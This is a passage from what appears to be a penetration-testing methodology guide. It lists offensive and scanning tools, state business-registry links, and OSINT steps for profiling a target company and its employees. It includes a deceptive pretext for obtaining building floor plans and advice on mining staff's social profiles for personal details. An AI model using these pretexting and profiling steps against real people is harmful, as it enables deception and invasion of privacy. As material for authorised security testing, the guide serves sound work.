<p>|-
|Maltego
|<a href="http://www.paterva.com/web5">http://www.paterva.com/web5</a>
|The defacto standard for mining data on individuals and companies.  Comes in a free community version and paid version.
|</p>
<p>|-
|Nessus
|<a href="http://tenable.com/products/nessus">http://tenable.com/products/nessus</a>
|A vulnerabilty scanning tool available in paid and free versions.  Nessus is useful for finding and documenting vulnerabilities mostly from the inside of a given network.
|</p>
<p>|-
|IBM AppScan
|<a href="http://www-01.ibm.com/software/awdtools/appscan">http://www-01.ibm.com/software/awdtools/appscan</a>
|IBM's automated Web application security testing suite.
|'''*'''</p>
<p>|-
|eEye Retina
|<a href="http://www.eeye.com/Products/Retina.aspx">http://www.eeye.com/Products/Retina.aspx</a>
|Retina is an an automated network vulnerability scanner that can be managed from a single web-based console.  It can be used in conjunction with Metasploit where if an exploit exists in Metasploit, it can be launched directly from Retina to verify that the vulnerability exists.
|</p>
<p>|-
|Nexpose
|<a href="http://www.rapid7.com">http://www.rapid7.com</a>
|Nexpose is a vulnerability scanner from the same company that brings you Metasploit.  Available in both free and paid versions that differ in levels of support and features.
|</p>
<p>|-
|OpenVAS
|<a href="http://www.openvas.org">http://www.openvas.org</a>
|OpenVAS is a vulnerability scanner that originally started as a fork of the Nessus project.  The actual security scanner is accompanied with a daily updated feed of Network Vulnerability Tests (NVTs), over 20,000 in total (as of January 2011)
|</p>
<p>|-
|HP WebInspect
|<a href="https://www.fortify.com/products/web_inspect.html">https://www.fortify.com/products/web_inspect.html</a>
|HP WebInspect performs web application security testing and assessment for complex web applications.  Supports JavaScript, Flash, Silverlight and others.
|'''*'''</p>
<p>|-
|HP SWFScan
|<a href="https://h30406.www3.hp.com/campaigns/2009/wwcampaign/1-5TUVE/index.php?key#swf">https://h30406.www3.hp.com/campaigns/2009/wwcampaign/1-5TUVE/index.php?key#swf</a>
|HP SWFScan is a free tool developed by HP Web Security Research Group to automatically find security vulnerabilities in applications built on the Flash platform.  Useful for decompiling flash apps and finding hard-coded credentials, etc.
|'''*'''</p>
<p>|-
|Backtrack Linux
|[<a href="http://www.backtrack-linux.org">http://www.backtrack-linux.org</a>]
|One of the most complete penetration testing Linux distributions available.  Includes many of the more popular free pentesting tools but is based on Ubuntu so it's also easily expandable.  Can be run on Live CD, USB key, VM or installed on a hard drive.
|</p>
<p>|-
|SamuraiWTF (Web Testing Framework)
|<a href="http://samurai.inguardians.com">http://samurai.inguardians.com</a>
|A live Linux distribution built for the specific purpose of web application scanning.  Includes tools such as Fierce, Maltego, WebScarab, BeEF any many more tools specific to web application testing.
|</p>
<p>|-
|SiteDigger
|<a href="http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx">http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx</a>
|SiteDigger 3.0 is a free tool that runs on Windows.  It searches Google’s cache to look for vulnerabilities, errors, configuration issues, proprietary information, and interesting security nuggets on web sites.
|'''*'''</p>
<p>|-
|FOCA
|<a href="http://www.informatica64.com/DownloadFOCA">http://www.informatica64.com/DownloadFOCA</a>
|FOCA is a tool that allows you to find out more about a website by (amongst other things) analysing the metadata in any documents it makes available.
|'''*'''</p>
<p>|-
|THC IPv6 Attack Toolkit
|<a href="http://www.thc.org/thc-ipv6">http://www.thc.org/thc-ipv6</a>
|The largest single collection of tools designed to exploit vulnerabilities in the IPv6 and ICMP6 protocols.
|</p>
<p>|-
|THC Hydra
|<a href="http://thc.org/thc-hydra/">http://thc.org/thc-hydra/</a>
|Hydra is a very fast network logon brute force cracker which can attack many different services and file_suport.<br />
|'''*'''</p>
<p>|-
|Cain
|<a href="http://www.oxid.it/cain.html">http://www.oxid.it/cain.html</a>
|Cain &amp; Abel is a password recovery tool that runs on Windows. It allows easy recovery of various kind of passwords by sniffing the network, cracking encrypted passwords using Dictionary, Brute-Force and Cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, recovering wireless network keys, revealing password boxes, uncovering cached passwords and analyzing routing protocols.
|'''*'''</p>
<p>|-
|cree.py
|<a href="http://ilektrojohn.github.com/creepy/">http://ilektrojohn.github.com/creepy/</a>
|cree.py gathers geolocation related information from social networking platforms and image hosting services. Then the information is presented in a map where all the retrieved data is shown accompanied with relevant information (i.e. what was posted from that specific location) to provide context.
|</p>
<p>|-
|inSSIDer
|<a href="http://www.metageek.net/products/inssider">http://www.metageek.net/products/inssider</a>
|inSSIDer is a free gui-based wifi discovery and troubleshooting tool for Windows
|'''*'''</p>
<p>|-
|Kismet Newcore
|<a href="http://www.kismetwireless.net">http://www.kismetwireless.net</a>
|Kismet is an 802.11 layer2 wireless network detector, sniffer, and intrusion detection system.  Kismet passively collects packets from both named and hidden networks with any wireless adapter that supports raw monitor mode.
|</p>
<p>|-
|Rainbow Crack
|<a href="http://project-rainbowcrack.com">http://project-rainbowcrack.com</a>
|Rainbow Crack is a password cracker that will run a pre-computed rainbow table against a given series of hashes.
|</p>
<p>|-
|dnsenum
|<a href="http://code.google.com/p/dnsenum">http://code.google.com/p/dnsenum</a>
|Think of dnsenum as a supercharged version of a whois query.  It not only discovers all of the dns records but it goes a step further and attempts to use google to discover subdomains, discovers BIND versions and more.
|</p>
<p>|-
|dnsmap
|<a href="http://code.google.com/p/dnsmap">http://code.google.com/p/dnsmap</a>
|Dnsmap is a passive dns mapper that is used for subdomain bruteforce discovery.
|</p>
<p>|-
|dnsrecon
|<a href="http://www.darkoperator.com/tools-and-scripts/">http://www.darkoperator.com/tools-and-scripts/</a>
|DNS enumeration script written in ruby for performing TLD expansion, SRV record enumeration, host and subdomain brute force, zone transfer, reverse lookup and general record identification.
|</p>
<p>|-
|dnstracer
|<a href="http://www.mavetju.org/unix/dnstracer.php">http://www.mavetju.org/unix/dnstracer.php</a>
|dnstracer determines where a given Domain Name Server (DNS) gets its information from and follows the chain of DNS servers back to the servers which know the data.
|</p>
<p>|-
|dnswalk
|<a href="http://sourceforge.net/projects/dnswalk">http://sourceforge.net/projects/dnswalk</a>
|Dnswalk is a DNS debugger. It performs zone transfers of specified domains, and checks the database in numerous ways for internal consistency, as well as accuracy.
|</p>
<p>|-
|Fierce
|<a href="http://ha.ckers.org/fierce">http://ha.ckers.org/fierce</a>
|Fierce domain scan discovers non-contiguous IP ranges of a network.
|</p>
<p>|-
|Fierce2
|<a href="http://trac.assembla.com/fierce/">http://trac.assembla.com/fierce/</a>
|Fierce 2 is an updated version that is maintained by a new group of developers.
|</p>
<p>|-
|FindDomains
|<a href="http://code.google.com/p/finddomains">http://code.google.com/p/finddomains</a>
|FindDomains is a multithreaded search engine discovery tool that will be very useful for penetration testers dealing with discovering domain names/web sites/virtual hosts which are located on too many IP addresses. Provides a console interface so you can easily integrate this tool to your pentesting automation system.
|'''*'''</p>
<p>|-
|HostMap
|<a href="http://hostmap.lonerunners.net">http://hostmap.lonerunners.net</a>
|hostmap is a free and automatic tool that enables the discovery of all hostnames and virtual hosts on a given IP address.
|</p>
<p>|-
|URLcrazy
|<a href="http://www.morningstarsecurity.com/research/urlcrazy">http://www.morningstarsecurity.com/research/urlcrazy</a>
|URLCrazy is a domainname typo generator.  This will allow you to find squatted domains related to your target company and possibly generate some of your own.
|</p>
<p>|-
|theHarvester
|<a href="http://www.edge-security.com/theHarvester.php">http://www.edge-security.com/theHarvester.php</a>
|theHarvester is a tool for gathering e-mail accounts, user names and hostnames/subdomains from different public sources like search engines and PGP key servers.
|</p>
<p>|-
|The Metasploit Framework
|<a href="http://metasploit.com">http://metasploit.com</a>
|Metasploit is an ever-growing collection of remote exploits and post exploitation tools for all platforms.  You will want to constantly run svn updates on this tool since new features and exploits are added nearly daily.  Metasploit is both incredibly powerful and complex.  For further guidance, check out this book <a href="http://nostarch.com/metasploit.htm">http://nostarch.com/metasploit.htm</a> .
|</p>
<p>|-
|The Social-Engineer Toolkit (SET)
|<a href="http://www.secmaniac.com/download/">http://www.secmaniac.com/download/</a>
|The Social-Engineer Toolkit (SET) is specifically designed to perform advanced attacks against the human element.  Amongst other things, SET allows you to craft malcious emails and dummy websites based on legitimate ones to compliment a social engineering attack.
|</p>
<p>|-
|Fast-Track
|<a href="http://www.secmaniac.com/download/">http://www.secmaniac.com/download/</a>
|Fast-Track is an automated pentesting tool suite.  Many of the issues Fast-Track exploits are due to improper sanitizing of client-side data within web applications, patch management, or lack of hardening techniques.  It runs on Linux and depends on Metasploit 3.
|</p>
<p>|}</p>
<hr />
<h2 id="intelligence-gathering">Intelligence Gathering</h2>
<p>Intelligence Gathering is the phase where data or "intelligence" is gathered to assist in guiding the assessment actions.  At the broadest level this intelligence gathering includes information about employees, facilities, products and plans.  Within a larger picture this intelligence will include potentially secret or private "intelligence" of a competitor, or information that is otherwise relevant to the target.</p>
<h3 id="osint">OSINT</h3>
<p>Open Source Intelligence (OSINT) in the simplest of terms is locating, and analyzing publically (open) available sources of information.  The key component here is that this intelligence gathering process has a goal of producing current and relevant information that is valuable to either an attacker or competitor.  For the most part, OSINT is more than simply performing web searches using various sources.</p>
<h4 id="corporate">Corporate</h4>
<p>Information on a particular target should include information regarding the legal entity.  Most states within the US require Corporations, limited liability companies and limited partnerships to file with the State division.  This division serves as custodian of the filings and maintains copies and/or certifications of the documents and filings.  This information may contain information regarding shareholders, members, officers or other persons involved in the target entity.</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''State'''</u>
|<u>'''URL'''</u></p>
<p>|-
|Alabama
|[<a href="http://sos.alabama.gov/BusinessServices/NameRegistration.aspx">http://sos.alabama.gov/BusinessServices/NameRegistration.aspx</a> <a href="http://sos.alabama.gov/BusinessServices/NameRegistration.aspx">http://sos.alabama.gov/BusinessServices/NameRegistration.aspx</a>]</p>
<p>|-
|Alaska 
|[<a href="http://www.dced.state.ak.us/bsc/corps.htm">http://www.dced.state.ak.us/bsc/corps.htm</a> <a href="http://www.dced.state.ak.us/bsc/corps.htm">http://www.dced.state.ak.us/bsc/corps.htm</a>]</p>
<p>|-
|Arizona
|[<a href="http://starpas.azcc.gov/scripts/cgiip.exe/WService#wsbroker1/main.p">http://starpas.azcc.gov/scripts/cgiip.exe/WService#wsbroker1/main.p</a> <a href="http://starpas.azcc.gov/scripts/cgiip.exe/WService#wsbroker1/main.p">http://starpas.azcc.gov/scripts/cgiip.exe/WService#wsbroker1/main.p</a>]</p>
<p>|-
|Arkansas
|[<a href="http://www.sosweb.state.ar.us/corps/incorp">http://www.sosweb.state.ar.us/corps/incorp</a> <a href="http://www.sosweb.state.ar.us/corps/incorp">http://www.sosweb.state.ar.us/corps/incorp</a>]</p>
<p>|-
|California
|[<a href="http://kepler.sos.ca.gov/">http://kepler.sos.ca.gov/</a> <a href="http://kepler.sos.ca.gov/">http://kepler.sos.ca.gov/</a>]</p>
<p>|-
|Colorado
|[<a href="http://www.state.co.us/">http://www.state.co.us/</a> <a href="http://www.state.co.us">http://www.state.co.us</a>]</p>
<p>|-
|Connecticut
|[<a href="http://www.state.ct.us/">http://www.state.ct.us/</a> <a href="http://www.state.ct.us">http://www.state.ct.us</a>]</p>
<p>|-
|Delaware
|[<a href="http://www.state.de.us/">http://www.state.de.us/</a> <a href="http://www.state.de.us">http://www.state.de.us</a>]</p>
<p>|-
|District of Columbia
|[<a href="http://www.ci.washington.dc.us/">http://www.ci.washington.dc.us/</a> <a href="http://www.ci.washington.dc.us">http://www.ci.washington.dc.us</a>]</p>
<p>|-
|Florida
|[<a href="http://www.sunbiz.org/search.html">http://www.sunbiz.org/search.html</a> <a href="http://www.sunbiz.org/search.html">http://www.sunbiz.org/search.html</a>]</p>
<p>|-
|Georgia
|[<a href="http://corp.sos.state.ga.us/corp/soskb/CSearch.asp">http://corp.sos.state.ga.us/corp/soskb/CSearch.asp</a> <a href="http://corp.sos.state.ga.us/corp/soskb/CSearch.asp">http://corp.sos.state.ga.us/corp/soskb/CSearch.asp</a>]</p>
<p>|-
|Hawaii
|[<a href="http://www.state.hi.us/">http://www.state.hi.us/</a> <a href="http://www.state.hi.us">http://www.state.hi.us</a>]</p>
<p>|-
|Idaho
|[<a href="http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep#crit">http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep#crit</a> <a href="http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep#crit">http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep#crit</a>]</p>
<p>|-
|Illinois
|[<a href="http://www.ilsos.gov/corporatellc">http://www.ilsos.gov/corporatellc</a> <a href="http://www.ilsos.gov/corporatellc">http://www.ilsos.gov/corporatellc</a>]</p>
<p>|-
|Indiana
|[<a href="http://secure.in.gov/sos/bus_service/online_corps/default.asp">http://secure.in.gov/sos/bus_service/online_corps/default.asp</a> <a href="http://secure.in.gov/sos/bus_service/online_corps/default.asp">http://secure.in.gov/sos/bus_service/online_corps/default.asp</a>]</p>
<p>|-
|Iowa
|[<a href="http://www.state.ia.us/">http://www.state.ia.us/</a> <a href="http://www.state.ia.us">http://www.state.ia.us</a>]</p>
<p>|-
|Kansas
|[<a href="http://www.accesskansas.org/apps/corporations.html">http://www.accesskansas.org/apps/corporations.html</a> <a href="http://www.accesskansas.org/apps/corporations.html">http://www.accesskansas.org/apps/corporations.html</a>]</p>
<p>|-
|Kentucky
|[<a href="http://ukcc.uky.edu/~vitalrec">http://ukcc.uky.edu/~vitalrec</a> <a href="http://ukcc.uky.edu/">http://ukcc.uky.edu/</a><nowiki>~</nowiki>vitalrec]</p>
<p>|-
|Louisiana
|[<a href="http://www.sec.state.la.us/crpinq.htm">http://www.sec.state.la.us/crpinq.htm</a> <a href="http://www.sec.state.la.us/crpinq.htm">http://www.sec.state.la.us/crpinq.htm</a>]</p>
<p>|-
|Maine
|[<a href="http://www.state.me.us/sos/cec/corp/ucc.htm">http://www.state.me.us/sos/cec/corp/ucc.htm</a> <a href="http://www.state.me.us/sos/cec/corp/ucc.htm">http://www.state.me.us/sos/cec/corp/ucc.htm</a>]</p>
<p>|-
|Maryland
|[<a href="http://sdatcert3.resiusa.org/ucc-charter">http://sdatcert3.resiusa.org/ucc-charter</a> <a href="http://sdatcert3.resiusa.org/ucc-charter">http://sdatcert3.resiusa.org/ucc-charter</a>]</p>
<p>|-
|Massachusetts
|[<a href="http://ucc.sec.state.ma.us/psearch/default.asp">http://ucc.sec.state.ma.us/psearch/default.asp</a> <a href="http://ucc.sec.state.ma.us/psearch/default.asp">http://ucc.sec.state.ma.us/psearch/default.asp</a>]</p>
<p>|-
|Michigan
|[<a href="http://www.cis.state.mi.us/bcs_corp/sr_corp.asp">http://www.cis.state.mi.us/bcs_corp/sr_corp.asp</a> <a href="http://www.cis.state.mi.us/bcs_corp/sr_corp.asp">http://www.cis.state.mi.us/bcs_corp/sr_corp.asp</a>]</p>
<p>|-
|Minnesota
|[<a href="http://www.state.mn.us/">http://www.state.mn.us/</a> <a href="http://www.state.mn.us/">http://www.state.mn.us/</a>]</p>
<p>|-
|Mississippi
|[<a href="http://www.sos.state.ms.us/busserv/corpsnap">http://www.sos.state.ms.us/busserv/corpsnap</a> <a href="http://www.sos.state.ms.us/busserv/corpsnap">http://www.sos.state.ms.us/busserv/corpsnap</a>]</p>
<p>|-
|Missouri
|[<a href="http://www.state.mo.us/">http://www.state.mo.us/</a> <a href="http://www.state.mo.us">http://www.state.mo.us</a>]</p>
<p>|-
|Montana
|[<a href="http://sos.state.mt.us/">http://sos.state.mt.us/</a> <a href="http://sos.state.mt.us">http://sos.state.mt.us</a>]</p>
<p>|-
|Nebraska
|[<a href="http://www.sos.state.ne.us/htm/UCCmenu.htm">http://www.sos.state.ne.us/htm/UCCmenu.htm</a> <a href="http://www.sos.state.ne.us/htm/UCCmenu.htm">http://www.sos.state.ne.us/htm/UCCmenu.htm</a>]</p>
<p>|-
|Nevada
|[<a href="http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm">http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm</a> <a href="http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm">http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm</a>]</p>
<p>|-
|New Hampshire
|[<a href="http://www.state.nh.us/">http://www.state.nh.us/</a> <a href="http://www.state.nh.us">http://www.state.nh.us</a>]</p>
<p>|-
|New Jersey
|[<a href="http://www.state.nj.us/treasury/revenue/searchucc.htm">http://www.state.nj.us/treasury/revenue/searchucc.htm</a> <a href="http://www.state.nj.us/treasury/revenue/searchucc.htm">http://www.state.nj.us/treasury/revenue/searchucc.htm</a>]</p>
<p>|-
|New Mexico
|[<a href="http://www.sos.state.nm.us/UCC/UCCSRCH.HTM">http://www.sos.state.nm.us/UCC/UCCSRCH.HTM</a> <a href="http://www.sos.state.nm.us/UCC/UCCSRCH.HTM">http://www.sos.state.nm.us/UCC/UCCSRCH.HTM</a>]</p>
<p>|-
|New York
|[<a href="http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show">http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show</a> <a href="http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show">http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show</a>]</p>
<p>|-
|North Carolina
|[<a href="http://www.secstate.state.nc.us/research.htm">http://www.secstate.state.nc.us/research.htm</a> <a href="http://www.secstate.state.nc.us/research.htm">http://www.secstate.state.nc.us/research.htm</a>]</p>
<p>|-
|North Dakota
|[<a href="http://www.state.nd.us/sec">http://www.state.nd.us/sec</a> <a href="http://www.state.nd.us/sec">http://www.state.nd.us/sec</a>]</p>
<p>|-
|Ohio
|[<a href="http://serform.sos.state.oh.us/pls/report/report.home">http://serform.sos.state.oh.us/pls/report/report.home</a> <a href="http://serform.sos.state.oh.us/pls/report/report.home">http://serform.sos.state.oh.us/pls/report/report.home</a>]</p>
<p>|-
|Oklahoma
|[<a href="http://www.oklahomacounty.org/coclerk/ucc/default.asp">http://www.oklahomacounty.org/coclerk/ucc/default.asp</a> <a href="http://www.oklahomacounty.org/coclerk/ucc/default.asp">http://www.oklahomacounty.org/coclerk/ucc/default.asp</a>]</p>
<p>|-
|Oregon
|[<a href="http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login">http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login</a> <a href="http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login">http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login</a>]</p>
<p>|-
|Pennsylvania
|[<a href="http://www.dos.state.pa.us/DOS/site/default.asp">http://www.dos.state.pa.us/DOS/site/default.asp</a> <a href="http://www.dos.state.pa.us/DOS/site/default.asp">http://www.dos.state.pa.us/DOS/site/default.asp</a>]</p>
<p>|-
|Rhode Island
|[<a href="http://155.212.254.78/">http://155.212.254.78/</a> <a href="http://155.212.254.78">http://155.212.254.78</a>]</p>
<p>|-
|South Carolina
|[<a href="http://www.scsos.com/corp_search.htm">http://www.scsos.com/corp_search.htm</a> <a href="http://www.scsos.com/corp_search.htm">http://www.scsos.com/corp_search.htm</a>]</p>
<p>|-
|South Dakota
|[<a href="http://www.state.sd.us/">http://www.state.sd.us/</a> <a href="http://www.state.sd.us">http://www.state.sd.us</a>]</p>
<p>|-
|Tennessee
|[<a href="http://www.state.tn.us/sos/service.htm">http://www.state.tn.us/sos/service.htm</a> <a href="http://www.state.tn.us/sos/service.htm">http://www.state.tn.us/sos/service.htm</a>]</p>
<p>|-
|Texas
|[<a href="https://ourcpa.cpa.state.tx.us/coa/Index.html">https://ourcpa.cpa.state.tx.us/coa/Index.html</a> <a href="https://ourcpa.cpa.state.tx.us/coa/Index.html">https://ourcpa.cpa.state.tx.us/coa/Index.html</a>]</p>
<p>|-
|Utah
|[<a href="http://www.commerce.state.ut.us/">http://www.commerce.state.ut.us/</a> <a href="http://www.commerce.state.ut.us">http://www.commerce.state.ut.us</a>]</p>
<p>|-
|Vermont
|[<a href="http://www.sec.state.vt.us/seek/database.htm">http://www.sec.state.vt.us/seek/database.htm</a> <a href="http://www.sec.state.vt.us/seek/database.htm">http://www.sec.state.vt.us/seek/database.htm</a>]</p>
<p>|-
|Virginia
|[<a href="http://www.state.va.us/">http://www.state.va.us/</a> <a href="http://www.state.va.us">http://www.state.va.us</a>]</p>
<p>|-
|Washington
|[<a href="http://www.dol.wa.gov/business/UCC/">http://www.dol.wa.gov/business/UCC/</a> <a href="http://www.dol.wa.gov/business/UCC/">http://www.dol.wa.gov/business/UCC/</a>]</p>
<p>|-
|West Virginia
|[<a href="http://www.wvsos.com/wvcorporations">http://www.wvsos.com/wvcorporations</a> <a href="http://www.wvsos.com/wvcorporations">http://www.wvsos.com/wvcorporations</a>]</p>
<p>|-
|Wisconsin
|[<a href="http://www.wdfi.org/corporations/crispix">http://www.wdfi.org/corporations/crispix</a> <a href="http://www.wdfi.org/corporations/crispix">http://www.wdfi.org/corporations/crispix</a>]</p>
<p>|-
|Wyoming
|[<a href="http://soswy.state.wy.us/Corp_Search_Main.asp">http://soswy.state.wy.us/Corp_Search_Main.asp</a> <a href="http://soswy.state.wy.us/Corp_Search_Main.asp">http://soswy.state.wy.us/Corp_Search_Main.asp</a>]</p>
<p>|}</p>
<h4 id="physical">Physical</h4>
<p>Often the first step in OSINT is to identify the physical locations of the target corporation.  This information might be readily available for publically known or published locations, but not quite so easy for more secretive sites.  Public sites can often be location by using search engines such as:</p>
<ul>
<li>Google -[<a href="http://www.google.com/">http://www.google.com/</a>  <a href="http://www.google.com">http://www.google.com</a>]</li>
<li>Yahoo - [<a href="http://yahoo.com/">http://yahoo.com/</a> <a href="http://yahoo.com">http://yahoo.com</a>]</li>
<li>Bing - [<a href="http://www.bing.com/">http://www.bing.com/</a> <a href="http://www.bing.com">http://www.bing.com</a>]</li>
<li>Ask.com - [<a href="http://ask.com/">http://ask.com/</a> <a href="http://ask.com">http://ask.com</a>]</li>
</ul>
<h5 id="locations">Locations</h5>
<h5 id="sharedindividual">Shared/Individual</h5>
<p>As part of identifying the physical location it is important to note if the location is an individual building or simply a suite in a larger facility.  It is important to attempt to identify neighboring businesses as well as common areas.</p>
<h5 id="owner">Owner</h5>
<p>Once the physical locations have been identified, it is useful to identify the actual property owner(s).  This can either be an individual, group, or corporation.  If the target corporation does not own the property then they may be limited in what they can physically do to enhance or improve the physical location.</p>
<h6 id="landtax-records">Land/tax records</h6>
<p>Tax records:</p>
<p><a href="http://www.naco.org/Counties/Pages/CitySearch.aspx">http://www.naco.org/Counties/Pages/CitySearch.aspx</a></p>
<p>Land and tax records generally include a wealth of information on a target such as ownership, possession, mortgage companies, foreclosure notices, photographs and more. The information recorded and level of transparency varies greatly by jurisdiction. Land and tax records within the United States are typically handled at the county level.</p>
<p>To start, if you know the city or zipcode in which your target resides, use a site such as <a href="http://publicrecords.netronline.com/">http://publicrecords.netronline.com/</a> to determine which county that is in.  Then switching over to Google you can use a query such as "XXXX county tax records", "XXXX county recording office" or "XXXX county assessor" and that should lead you to a searchable online database if one exists.  If it does not exist, you can still call the county recording office and request that they fax you specific records if you have an idea of what you are looking for.</p>
<p>Building department:</p>
<p>For some assessments, it might make sense to go a step further and query the local building department for additional information.  Depending on the city, the target's site might be under county or city jurisdiction.  Typically that can be determined by a call to either entity.</p>
<p>The building department generally has floor plans, old &amp; current permits, tenant improvement information and other similar information on file.  Buried in that information might be names of contracting firms, engineers, architects and more.  All of which could be used with a tool such as SET.  In most cases, a phone call will be required to obtain any of this information but most building departments are happy to hand it out to anyone who asks.</p>
<p>Here is a possible pretext you could use to obtain floor plans: You could call up and say that you are an architectural consultant who has been hired to design a remodel or addition to the building and it would help the process go much smoother if you could get a copy of the original plans.</p>
<h4 id="datacenter-locations">Datacenter Locations</h4>
<p>Identifying any target business data center locations via either the corporate website, public filings, land records or via a search engine can provide additional potential targets.</p>
<h5 id="time-zones">Time zones</h5>
<p>Identifying the time zones that the target operates in provides valuable information regarding the hours of operation.  It is also significant to understand the relationship between the target time zone and that of the assessment team.  A time zone map is often useful as a reference when conducting any test.</p>
<p>[[:File:Penetration_Testing_Execution_02.png|TimeZone Map]]</p>
<h5 id="offsite-gathering">Offsite gathering</h5>
<p>Identifying any recent or future offsite gatherings or parties via either the corporate website or via a search engine can provide valuable insight into the corporate culture of a target.  It is often common practice for businesses to have offsite gatherings not only for employees, but also for business partners and customers.  Collecting this data could provide insight into potential items of interest to an attacker.</p>
<h5 id="productservices">Product/Services</h5>
<p>Identifying the target business products and any significant data related to such launches via the corporate website, new releases or via a search engine can provide valuable insight into the internal workings of a target.  It is often common practice for businesses to make such notifications publicly in an effort to garner publicity and to inform current and/or new customers of the launch.  Publicly available information includes, but is not limited to, foreign language documents, radio and television broadcasts, Internet sites, and public speaking.</p>
<h5 id="company-dates">Company Dates</h5>
<p>Significant company dates can provide insight into potential days where staff may be on alert higher than normal.  This could be due to potential corporate meetings, board meetings, investor meetings, or corporate anniversary.  Normally, businesses that observe various holidays have a significantly reduced staff and therefore targeting may prove to be much more difficult during these periods.</p>
<h5 id="position-identification">Position identification</h5>
<p>Within every target it is critical that you identify and document the top positions within the organization.  This is critical to ensure that the resulting report is targeting the correct audience.  At a minimum, key employees should be identified as part of any engagement.</p>
<h5 id="organizational-chart">Organizational Chart</h5>
<p>Understanding the organizational structure is important, not only to understand the depth of the structure, but also the breadth.  If the organization is extremely large, it is possible that new staff or personnel could go undetected.  In smaller organizations, the likelihood is not as great.  Getting a good picture of this structure can also provide insight into the functional groups.  This information can be useful in determining internal targets.</p>
<h5 id="corporate-communications">Corporate Communications</h5>
<p>Identifying corporate communications either via the corporate website or a job search engine can provide valuable insight into the internal workings of a target.</p>
<h6 id="marketing">Marketing</h6>
<p>Marketing communications are often used to make corporate announcements regarding currently, or future product releases, and partnerships.</p>
<h6 id="lawsuits">Lawsuits</h6>
<p>Communications regarding the targets involvement in litigation can provide insight into potential threat agent or data of interest.</p>
<h6 id="transactions">Transactions</h6>
<p>Communications involving corporate transactions may be indirect response to a marketing announcement or lawsuit.</p>
<h5 id="job-openings">Job openings</h5>
<p>Searching current job openings or postings via either the corporate website or via a job search engine can provide valuable insight into the internal workings of a target.  It is often common practice to include information regarding currently, or future, technology implementations.  Collecting this data could provide insight into potential items of interest to an attacker.  Several Job Search Engines exist that can be queried for information regarding the target.</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Site'''</u>
|<u>'''URL'''</u></p>
<p>|-
|Monster
|[<a href="http://www.monster.com/">http://www.monster.com/</a> <a href="http://www.monster.com">http://www.monster.com</a>]</p>
<p>|-
|CareerBuilder
|[<a href="http://www.careerbuilder.com/">http://www.careerbuilder.com/</a> <a href="http://www.careerbuilder.com">http://www.careerbuilder.com</a>]</p>
<p>|-
|Computerjobs.com
|[<a href="http://www.computerjobs.com/">http://www.computerjobs.com/</a> <a href="http://www.computerjobs.com">http://www.computerjobs.com</a>]</p>
<p>|-
|Craigslist
|[<a href="http://www.craigslist.org/about/sites/">http://www.craigslist.org/about/sites/</a> <a href="http://www.craigslist.org/about/sites">http://www.craigslist.org/about/sites</a>]</p>
<p>|}</p>
<h4 id="relationships">Relationships</h4>
<p>Identifying the targets logical relationships is critical to understand more about how the business operates.  Publicly available information should be leveraged to determine the target business relationship with vendors, business partners, law firms, etc.  This is often available via news releases, corporate web sites (target and vendors), and potentially via industry related forums.</p>
<h5 id="charity-affiliations">Charity Affiliations</h5>
<p>Identifying any target business charity affiliations via either the corporate website or via a search engine can provide valuable insight into the internal workings and potentially the corporate culture of a target.  It is often common practice for businesses to make charitable donations to various organizations.  Collecting this data could provide insight into potential items of interest to an attacker.</p>
<h5 id="network-providers">Network Providers</h5>
<p>Identifying any network provisioning or providers either via the allocated netblock /address information, corporate website or via a search engine can provide valuable insight into the potentially of a target.  It is often common practice for businesses to make charitable donations to various organizations.  Collecting this data could provide insight into potential items of interest to an attacker.</p>
<h5 id="business-partners">Business Partners</h5>
<p>Identifying business partners is critical to gaining insight into not only the corporate culture of a target, but also potentially technologies being used.  It is often common practice for businesses to announce partnership agreements.  Collecting this data could provide insight into potential items of interest to an attacker.</p>
<h5 id="competitors">Competitors</h5>
<p>Identifying competitors can provide a window into potential adversaries.  It is not uncommon for competitors to announce news that could impact the target.  These could range from new hires, product launches, and even partnership agreements.  Collecting this data is important to fully understand any potential corporate hostility.</p>
<h3 id="individuals">Individuals</h3>
<h6 id="social-networking-profile">Social Networking Profile</h6>
<p>The numbers of active Social Networking websites as well as the number of users make this a prime location to identify employee's friendships, kinships, common interest, financial exchanges, likes/dislikes, sexual relationships, or beliefs.  It is even possible to determine an employee's corporate knowledge or prestige.</p>
<h6 id="social-networking-websites">Social Networking Websites</h6>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Name'''</u>
|<u>'''URL'''</u>
|<u>'''Description/Focus'''</u></p>
<p>|-
|Academia.edu
|[<a href="http://www.academia.edu/">http://www.academia.edu/</a> <a href="http://www.academia.edu">http://www.academia.edu</a>]
|Social networking site for academics/researchers</p>
<p>|-
|Advogato
|[<a href="http://www.advogato.org/">http://www.advogato.org/</a> <a href="http://www.advogato.org">http://www.advogato.org</a>]
|Free and open source software developers  </p>
<p>|-
|aNobii
|[<a href="http://www.anobii.com/anobii_home">http://www.anobii.com/anobii_home</a> <a href="http://www.anobii.com/anobii_home">http://www.anobii.com/anobii_home</a>]
|Books</p>
<p>|-
|aSmallWorld
|[<a href="http://www.asmallworld.net/">http://www.asmallworld.net/</a> <a href="http://www.asmallworld.net">http://www.asmallworld.net</a>]
|European jet set and social elite world-wide  </p>
<p>|-
|AsianAvenue
|[<a href="http://www.asianave.com/">http://www.asianave.com/</a> <a href="http://www.asianave.com">http://www.asianave.com</a>]
|A social network for the Asian American community  </p>
